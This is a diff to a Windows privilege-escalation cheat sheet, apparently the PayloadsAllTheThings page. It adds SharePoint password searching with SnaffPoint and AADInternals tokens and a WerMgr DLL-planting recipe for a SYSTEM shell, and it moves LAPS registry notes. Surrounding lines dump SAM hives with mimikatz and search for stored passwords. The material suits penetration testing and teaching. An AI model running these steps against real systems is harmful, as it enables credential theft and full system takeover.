@@ -14,8 +14,8 @@
     * [Default Writeable Folders](#default-writeable-folders)
 * [EoP - Looting for passwords](#eop---looting-for-passwords)
     * [SAM and SYSTEM files](#sam-and-system-files)
-    * [LAPS Settings](#laps-settings)
     * [HiveNightmare](#hivenightmare)
+    * [LAPS Settings](#laps-settings)
     * [Search for file contents](#search-for-file-contents)
     * [Search for a file with a certain filename](#search-for-a-file-with-a-certain-filename)
     * [Search the registry for key names and passwords](#search-the-registry-for-key-names-and-passwords)
@@ -55,6 +55,7 @@
     * [DiagHub](#diaghub)
     * [UsoDLLLoader](#usodllloader)
     * [WerTrigger](#wertrigger)
+    * [WerMgr](#wermgr)
 * [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposure)
     * [MS08-067 (NetAPI)](#ms08-067-netapi)
     * [MS10-015 (KiTrap0D)](#ms10-015-kitrap0d---microsoft-windows-nt2000--2003--2008--xp--vista--7)
@@ -301,7 +302,7 @@ Disable firewall
 
 ```powershell
 # Disable Firewall on Windows 7 via cmd
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f
 
 # Disable Firewall on Windows 7 via Powershell
 powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value'`
@@ -405,15 +406,6 @@ samdump2 SYSTEM SAM -o sam.txt
 
 Either crack it with `john -format=NT /root/sam.txt`, [hashcat](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md#hashcat) or use Pass-The-Hash.
 
-### LAPS Settings
-
-Extract `HKLM\Software\Policies\Microsoft Services\AdmPwd` from Windows Registry.
-
-* LAPS Enabled: AdmPwdEnabled
-* LAPS Admin Account Name: AdminAccountName
-* LAPS Password Complexity: PasswordComplexity
-* LAPS Password Length: PasswordLength
-* LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled
 
 ### HiveNightmare
 
@@ -443,14 +435,47 @@ mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\W
 mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
 ```
 
+### LAPS Settings
+
+Extract `HKLM\Software\Policies\Microsoft Services\AdmPwd` from Windows Registry.
+
+* LAPS Enabled: AdmPwdEnabled
+* LAPS Admin Account Name: AdminAccountName
+* LAPS Password Complexity: PasswordComplexity
+* LAPS Password Length: PasswordLength
+* LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled
+
 
 ### Search for file contents
 
 ```powershell
 cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
-findstr /si password *.xml *.ini *.txt *.config
+findstr /si password *.xml *.ini *.txt *.config 2>nul >> results.txt
 findstr /spin "password" *.*
 ```
+
+Also search in remote places such as SMB Shares and SharePoint:
+
+* Search passwords in SharePoint: [nheiniger/SnaffPoint](https://github.com/nheiniger/SnaffPoint) (must be compiled first, for referencing issue see: https://github.com/nheiniger/SnaffPoint/pull/6)
+
+```powershell
+# First, retrieve a token
+## Method 1: using SnaffPoint binary
+$token = (.\GetBearerToken.exe https://your.sharepoint.com)
+## Method 2: using AADInternals
+Install-Module AADInternals -Scope CurrentUser
+Import-Module AADInternals
+$token = (Get-AADIntAccessToken -ClientId "9bc3ab49-b65d-410a-85ad-de819febfddc" -Tenant "your.onmicrosoft.com" -Resource "https://your.sharepoint.com")
+
+# Second, search on Sharepoint
+## Method 1: using search strings in ./presets dir
+.\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token
+## Method 2: using search string in command line
+### -l uses FQL search, see: https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference
+.\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token -l -q "filename:.config"
+```
+
+* Search passwords in SMB Shares: [SnaffCon/Snaffler](https://github.com/SnaffCon/Snaffler)
 
 ### Search for a file with a certain filename
 
@@ -475,12 +500,6 @@ reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
 
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
-```
-
-### Read a value of a certain sub key
-
-```powershell
-REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList
 ```
 
 ### Passwords in unattend.xml
@@ -1341,12 +1360,22 @@ If we found a privileged file write vulnerability in Windows or in some third-pa
 
 ### WerTrigger
 
-> Weaponizing for privileged file writes bugs with Windows problem reporting
+> Exploit Privileged File Writes bugs with Windows Problem Reporting
 
 1. Clone https://github.com/sailay1996/WerTrigger
 2. Copy `phoneinfo.dll` to `C:\Windows\System32\`
 3. Place `Report.wer` file and `WerTrigger.exe` in a same directory.
 4. Then, run `WerTrigger.exe`.
+5. Enjoy a shell as **NT AUTHORITY\SYSTEM**
+
+### WerMgr
+
+> Exploit Privileged Directory Creation Bugs with Windows Error Reporting
+
+1. Clone https://github.com/binderlabs/DirCreate2System
+2. Create directory `C:\Windows\System32\wermgr.exe.local\`
+3. Grant access to it: `cacls C:\Windows\System32\wermgr.exe.local /e /g everyone:f`
+4. Place `spawn.dll` file and `dircreate2system.exe` in a same directory and run `.\dircreate2system.exe`. 
 5. Enjoy a shell as **NT AUTHORITY\SYSTEM**
 
 
@@ -1477,9 +1506,8 @@ Detailed information about the vulnerability : https://www.zerodayinitiative.com
 
 ## References
 
-* [Windows Internals Book - 02/07/2017](https://docs.microsoft.com/en-us/sysinternals/learn/windows-internals)
 * [icacls - Docs Microsoft](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)
-* [Privilege Escalation Windows - Philip Linghammar](https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html)
+* [Privilege Escalation Windows - Philip Linghammar](https://web.archive.org/web/20191231011305/https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html)
 * [Windows elevation of privileges - Guifre Ruiz](https://guif.re/windowseop)
 * [The Open Source Windows Privilege Escalation Cheat Sheet by amAK.xyz and @xxByte](https://addaxsoft.com/wpecs/)
 * [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
@@ -1504,9 +1532,9 @@ Detailed information about the vulnerability : https://www.zerodayinitiative.com
 * [Pentestlab.blog - WPE-13 - Intel SYSRET](https://pentestlab.blog/2017/06/14/intel-sysret/)
 * [Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @_xpn_](https://blog.xpnsec.com/becoming-system/)
 * [Living Off The Land Binaries and Scripts (and now also Libraries)](https://github.com/LOLBAS-Project/LOLBAS)
-* [Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec](https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html)
+* [Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec](https://web.archive.org/web/20191105182846/https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html)
 * [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
-* [Abusing Diaghub - xct - March 07, 2019](https://vulndev.io/howto/2019/03/07/diaghub.html)
+* [Abusing Diaghub - xct - March 07, 2019](https://vulndev.io/2019/03/06/abusing-diaghub/)
 * [Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege - James Forshaw, Project Zero - Wednesday, April 18, 2018](https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html)
 * [Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019](https://itm4n.github.io/usodllloader-part2/)
 * [Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para Windows](https://www.elladodelmal.com/2020/03/hacking-trick-environment-variable-path.html?m=1)
